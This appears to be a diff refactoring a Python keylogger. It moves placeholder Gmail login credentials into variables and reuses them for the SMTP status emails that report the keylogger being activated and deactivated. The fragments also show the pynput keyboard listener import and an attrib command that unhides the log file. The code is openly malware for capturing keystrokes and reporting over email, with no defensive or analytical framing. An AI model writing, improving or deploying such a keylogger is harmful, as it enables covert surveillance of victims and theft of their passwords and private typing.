@@ -5,13 +5,11 @@ def main():
         from pynput.keyboard import Key, Listener
 
         if IsAccountActive:
-            from_addr = "$EMAIL"
-            to_addr = "$EMAIL"
             msg = "Keylogger Activated Successfully..."
 
             try:
                 print("[INFO]\tSending status email...")
-                server.sendmail(from_addr, to_addr, msg)
+                server.sendmail(email, to_addr, msg)
                 print("[INFO]\tEmail sent successfully...")
 
             except SMTPServerDisconnected as connection_error_1:
@@ -218,13 +216,11 @@ def main():
             terminal("attrib -h log.txt")
 
         if IsAccountActive:
-            from_addr = "$EMAIL"
-            to_addr = "$EMAIL"
             msg = "Keylogger deactivated by user..."
 
             try:
                 print("[INFO]\tSending status email...")
-                server.sendmail(from_addr, to_addr, msg)
+                server.sendmail(email, to_addr, msg)
                 print("[INFO]\tEmail sent successfully...")
 
             except SMTPServerDisconnected as connection_error_0:
@@ -290,6 +286,10 @@ try:
         terminal("title Keylogger")
 
     IsAccountActive = False
+    
+    email = "$EMAIL"
+    password = "$PASSWORD"
+    to_addr = "$EMAIL"
 
     try:
         print("[INFO]\tConnecting to smtp.gmail.com:587")
@@ -298,7 +298,7 @@ try:
 
         try:
             print("[INFO]\tLogin to Gmail address.")
-            server.login("$EMAIL", "$PASSWORD")
+            server.login(email, password)
 
             IsAccountActive = True
 
